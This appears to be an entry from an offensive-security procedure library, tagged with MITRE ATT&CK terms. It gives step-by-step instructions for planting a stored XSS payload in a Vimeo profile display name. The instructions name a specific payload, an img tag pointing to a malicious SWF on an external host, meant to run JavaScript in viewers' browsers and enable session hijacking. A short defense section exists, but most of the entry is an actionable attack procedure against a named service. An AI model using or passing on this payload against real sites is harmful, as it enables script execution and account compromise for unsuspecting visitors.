---
tags:
  - xss
  - stored-xss
  - profile-injection
type: procedure
tools:
  - '[[tools/xss-swf-Malicious-Flash-File]]'
tactics:
  - '[[Initial Access]]'
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Drive-by Compromise]]'
updated_at: '2025-12-14T03:15:47.425Z'
skill_level: intermediate
impact_level: high
detection_risk: low
sub_techniques: []
id: 4f86beaf-782e-4cac-b067-0d845a323b12
validated: true
mitre_tactics:
  - '[[Initial Access]]'
mitre_techniques:
  - '[[Drive-by Compromise]]'
---
# Inject-Malicious-Payload-into-Vimeo-User-Profile

## Summary

This procedure injects a malicious HTML payload into a Vimeo's user display name, exploiting the lack of escaping in the Hubnut widget's Flash rendering to enable stored XSS when the profile is viewed.

## Description

In the context of Vimeo's platform, the user's display name is stored in the profile and fetched for display in the Hubnut widget via a Flash file (hubnut.swf). Without proper HTML escaping, injecting an <img> tag with an external src pointing to a malicious SWF allows the Flash to load and execute JavaScript upon page load. This targets authenticated users with profile edit access and affects viewers of the Hubnut page, leading to client-side execution on vimeo.com and player.vimeo.com.

## Requirements

1. Valid Vimeo account credentials with profile editing permissions.
2. Access to host an external malicious SWF file (e.g., on u00f1.xyz).
3. Standard web browser for navigation and form submission.

## Defense

Defensive measures and detection strategies:

- Implement HTML escaping for all user-controlled inputs rendered in Flash or client-side contexts.
- Disable or replace Flash usage with modern HTML5 alternatives.
- Monitor for anomalous external resource loads in Flash files via WAF rules.

## Objectives

1. Persist a malicious payload in the user profile for later execution.
2. Set up conditions for arbitrary JavaScript execution on victim browsers.
3. Enable potential follow-on attacks like session hijacking.

## Instructions

### Step 1: Access Account Settings

**Context**: Log in and navigate to the profile settings to locate the display name field.

**Command** (Browser Action):

Navigate to https://vimeo.com/settings in your browser.

> This loads the account settings page where the Name field is editable.

### Step 2: Inject and Save Payload

**Context**: Enter the malicious payload into the display name and persist it.

**Command** (Browser Action):

Set the Name field to '<img src="//u00f1.xyz/xss.swf">' and click 'Save Changes'.

> The payload is stored server-side in the user's profile data, ready for rendering in Hubnut.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]]

### Techniques

- [[Drive-by Compromise]]

### Sub-Techniques


## Commands Used


## Tools Used

- [[tools/xss-swf-Malicious-Flash-File]]

## Tags

- xss
- stored-xss
- flash-injection
